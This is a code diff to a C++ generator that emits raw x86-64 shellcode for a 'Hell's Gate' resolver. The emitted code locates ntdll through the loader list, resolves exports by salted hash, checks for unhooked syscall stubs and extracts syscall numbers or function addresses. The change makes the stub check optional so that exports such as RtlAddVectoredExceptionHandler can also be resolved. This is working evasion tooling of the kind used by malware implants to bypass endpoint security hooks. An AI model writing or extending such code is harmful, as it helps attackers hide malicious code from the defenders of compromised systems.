@@ -32,30 +32,47 @@ inline void patch_rel8(RawEmitter& e, size_t patch, size_t target) noexcept {
 /// Shared body emitter — `return_address` flips the final extract
 /// between SSN (r13d = [rdi+4]) and function-address (r13 = rdi).
 /// `salt` folds into the DJB2 seed (see header for rationale).
+/// `validate_syscall_prologue` controls whether the emitted code
+/// rejects the match unless the function's first 4 bytes are the
+/// canonical `4C 8B D1 B8` syscall stub prefix — required for the
+/// SSN extract and for syscall-stub callers, but must be turned
+/// off for resolver calls that target non-Nt* exports (e.g.,
+/// `RtlAddVectoredExceptionHandler` has a standard user-mode
+/// prologue that won't match).
 void emit_hells_gate_common(RawEmitter& e,
                             uint32_t target_name_hash,
                             uint32_t salt,
-                            bool return_address);
+                            bool return_address,
+                            bool validate_syscall_prologue);
 
 } // anonymous namespace
 
 void emit_hells_gate_resolver(RawEmitter& e,
                               uint32_t    target_name_hash,
                               uint32_t    salt) {
-    emit_hells_gate_common(e, target_name_hash, salt, /*return_address=*/false);
+    // The SSN variant inherently needs the 4-byte prologue — the
+    // SSN itself lives inside that prologue — so validation is
+    // always on for it.
+    emit_hells_gate_common(e, target_name_hash, salt,
+                           /*return_address=*/false,
+                           /*validate_syscall_prologue=*/true);
 }
 
 void emit_hells_gate_address_resolver(RawEmitter& e,
                                       uint32_t    target_name_hash,
-                                      uint32_t    salt) {
-    emit_hells_gate_common(e, target_name_hash, salt, /*return_address=*/true);
+                                      uint32_t    salt,
+                                      bool        validate_syscall_prologue) {
+    emit_hells_gate_common(e, target_name_hash, salt,
+                           /*return_address=*/true,
+                           validate_syscall_prologue);
 }
 
 namespace {
 void emit_hells_gate_common(RawEmitter& e,
                             uint32_t target_name_hash,
                             uint32_t salt,
-                            bool return_address)
+                            bool return_address,
+                            bool validate_syscall_prologue)
 {
     // ------------------------------------------------------------
     // Pre-scan setup: locate ntdll (2nd module in Ldr list) and
@@ -255,17 +272,24 @@ void emit_hells_gate_common(RawEmitter& e,
     //   rdi = function body start.
     e.u8(0x48); e.u8(0x8D); e.u8(0x3C); e.u8(0x03);
 
-    // cmp dword [rdi], 0xB8D18B4C        81 3F 4C 8B D1 B8            (6)
-    //   Validate unhooked prologue: `mov r10, rcx; mov eax, ...`.
-    //   Little-endian, so 4C 8B D1 B8 becomes the imm32 literal.
-    e.u8(0x81); e.u8(0x3F);
-    e.u8(0x4C); e.u8(0x8B); e.u8(0xD1); e.u8(0xB8);
+    // Prologue validation. Optional for the address-return variant
+    // when the caller knows the target isn't a syscall stub.
+    size_t patch_jne_done = 0;
+    bool has_prologue_jne = false;
+    if (validate_syscall_prologue) {
+        // cmp dword [rdi], 0xB8D18B4C    81 3F 4C 8B D1 B8            (6)
+        //   Validate unhooked prologue: `mov r10, rcx; mov eax, ...`.
+        //   Little-endian, so 4C 8B D1 B8 becomes the imm32 literal.
+        e.u8(0x81); e.u8(0x3F);
+        e.u8(0x4C); e.u8(0x8B); e.u8(0xD1); e.u8(0xB8);
 
-    // jne short .done                    75 rel8                      (2)
-    //   Hooked or non-syscall export → bail with r13 = 0.
-    e.u8(0x75);
-    const size_t patch_jne_done = e.size();
-    e.u8(0x00);
+        // jne short .done                75 rel8                      (2)
+        //   Hooked or non-syscall export → bail with r13 = 0.
+        e.u8(0x75);
+        patch_jne_done = e.size();
+        e.u8(0x00);
+        has_prologue_jne = true;
+    }
 
     if (return_address) {
         // mov r13, rdi                    49 89 FD                     (3)
@@ -300,7 +324,9 @@ void emit_hells_gate_common(RawEmitter& e,
     // --- .done: ---
     const size_t label_done = e.size();
     patch_rel8(e, patch_jae_done, label_done);
-    patch_rel8(e, patch_jne_done, label_done);
+    if (has_prologue_jne) {
+        patch_rel8(e, patch_jne_done, label_done);
+    }
     patch_rel8(e, patch_jmp_done, label_done);
 }
 
